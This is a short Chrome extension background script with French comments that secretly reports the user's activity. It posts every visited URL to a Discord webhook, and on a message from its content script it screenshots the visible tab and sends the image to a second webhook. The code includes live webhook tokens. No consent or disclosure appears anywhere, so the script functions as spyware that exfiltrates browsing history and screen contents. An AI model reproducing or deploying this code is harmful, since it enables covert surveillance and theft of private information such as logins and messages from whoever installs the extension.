// 1. Envoie chaque URL visitée
chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (changeInfo.status === "complete" && tab.url) {
    fetch("https://discord.com/api/webhooks/1362038340538466445/dTK5OEJ6iTxLEpUdRaDehOYqte4upxZSW0G0gF2cQzX81iYymBsSsNHIBzRfYqDZ4Ruy", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        content: `🔗 Nouveau site visité : ${tab.url}`
      })
    });
  }
});

// 2. Capture d'écran envoyée par le content script
chrome.runtime.onMessage.addListener((msg, sender) => {
  if (msg.action === "capture" && msg.url) {
    chrome.tabs.captureVisibleTab(null, { format: "png" }, function (dataUrl) {
      fetch("https://discord.com/api/webhooks/1362038729186738216/hE24aPmgwR35PTiMannngijV4TEhezOOH-A86WISs-dJp_vaZBKcU8Pds0h4K0PCzELT", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          content: `📸 Capture d'écran de : ${msg.url}`,
          embeds: [{
            image: { url: dataUrl }
          }]
        })
      });
    });
  }
});
